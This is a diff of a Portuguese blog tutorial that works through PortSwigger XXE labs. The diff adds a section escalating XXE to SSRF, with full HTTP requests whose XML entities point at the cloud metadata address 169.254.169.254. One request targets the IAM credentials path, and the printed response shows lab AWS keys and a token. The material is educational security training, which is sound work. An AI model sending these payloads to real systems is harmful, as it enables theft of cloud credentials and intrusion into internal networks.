@@ -14,7 +14,7 @@ tags:
  
  Mias uma série! Desta vez abordaremos **XML External Entities** ou carinhosamente chamado de **XXE**. Mais um vez, meu intuito aqui não é abordar o que é XML, nem mesmo explicar teoricamente XXE, mas te mostrar de forma prática o que seria e como lidar com essa falha, trabalhando o pensamento ofensivo.
 
-Também não é minha intensão te ensinar a resolver labs. Porém, vou usar alguns aqui para te demonstrar essa falha, caos queira acompanhar (recomendo), deixarei o link do lab usado [aqui](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) .
+Também não é minha intensão te ensinar a resolver labs. Porém, vou usar alguns aqui para te demonstrar essa falha, caos queira acompanhar (recomendo), deixarei os links dos labs usados no final do paper.. 
 ### XXE: Aonde ele está?
 
 Antes de qualquer passo, primeiro precisamos pensar: Aonde eu posso encontra-lo? Devemos ter a capacidade analítica de olhar para cada ponto da aplicação e nos questionarmos sobre quais brechas teríamos ali.
@@ -191,6 +191,107 @@ print(root.find("productId").text)
 ```
 
 E o principal: o **parser** estar configurado para resolver **entidades externas**. É isso que alavanca e torna possível a falha. Aqui mora o problema.
+### XXE + SSRF: Escalando...
+
+Resolvi adicionar essa seção aqui para juntar os dois cenários em um único lugar. Uma vez descobrindo um XXE você pode tenta um **SSRF** e a partir dele tentar descobrir outros ativos e serviços dentro da rede interna.
+
+A request em si não mudo muito. O cenário também não. Creio que a essa altura você já conheça um SSRF. 
+
+O interessante ao achar um XXE poderia ser tentar um SSRF, e poderíamos tentar da seguinte forma:
+
+```
+POST /product/stock HTTP/2
+Host: 0a0800ef040f212680440ded00a50051.web-security-academy.net
+Cookie: session=5JayYxiz0u88J2s4kBfixbZ1xaQGH6xH
+Content-Length: 181
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: pt-BR,pt;q=0.9
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/xml
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a0800ef040f212680440ded00a50051.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a0800ef040f212680440ded00a50051.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<stockCheck>
+	<productId>&xxe;</productId>
+	<storeId>1</storeId>
+</stockCheck>
+```
+
+A resposta:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 28
+
+"Invalid product ID: latest"
+```
+
+Veja que funcionou. Esse IP nos foi fornecido pela própria PortSwigger.
+
+Nesse caso aqui, poderíamos ir mapeando a aplicação, tentando endpoints, portas e por aí vai. Vai da criatividade e intenção de quem está testando.
+
+Mas o fato é: achou XXE, tente SSRF, pode dar certo e escalar o ataque.
+
+Aqui está um exemplo:
+
+```
+POST /product/stock HTTP/2
+Host: 0a0800ef040f212680440ded00a50051.web-security-academy.net
+Cookie: session=5JayYxiz0u88J2s4kBfixbZ1xaQGH6xH
+Content-Length: 228
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: pt-BR,pt;q=0.9
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Content-Type: application/xml
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0a0800ef040f212680440ded00a50051.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a0800ef040f212680440ded00a50051.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+	<productId>&xxe;</productId>
+	<storeId>1</storeId>
+</stockCheck>
+```
+
+A resposta:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 552
+
+"Invalid product ID: {
+  "Code" : "Success",
+  "LastUpdated" : "2026-03-24T19:53:29.628610167Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "awBbQ92lT6umd6lrM6ie",
+  "SecretAccessKey" : "dKWyOavlVzaYUD6qCj32iKrVwT5X7g2pEh0z5FR8",
+  "Token" : "IoDJarst7gqO62sO4nKVWTJKAFRJv5HW4wxVLhTulUvLFeoULdTzmk4QeAwCrhsDU9vy1SULaOpP5AeqIFU6KsHl6Q6ZDfXAqhpaElmbDfQt8st9O2ooLIKjeahr2hYtZUUVbELkj981DiLIEoiqpxA0FLMxcgCDZPDWvV2AFNdEtigai8AdeYixhbZeEk4dvDkCrxMa8g4GELfP5spy310kQwDW15bymza3O8BWibWYRiIeZvx9CgLSEcYVlOFX",
+  "Expiration" : "2032-03-22T19:53:29.628610167Z"
+}"
+```
 
 ## No fim...
 
@@ -198,5 +299,8 @@ Esse cenário é bem simples, eu sei, mas serve de base para qualquer outro mais
 
 Em cenários reais isso fará total diferença na busca por falhas, caso você ainda não teve oportunidade de lidar com cenários fora de labs ou CTFs, você perceberá que há um diferença grande ao lidar com cenários reais. É certo que XXE não deixará de ser XXE, XSS não deixará de ser XSS, o que vai contar é a sua capacidade analítica de tentar encaixar a falha no contexto do cenário.
 
+E que mutias vezes uma falha por si só não trará tanto impacto e que portanto, você precisará pensar em formas de escalar o ataque para aumentar o impacto, como foi o caso do SSRF, muito embora o XXE neste cenário já foi impactante.
+
 ---
 Para saber mais sobre [XXE](https://portswigger.net/web-security/xxe) .
+Link dos labs: [Lab 1](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) e [Lab 2](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) .
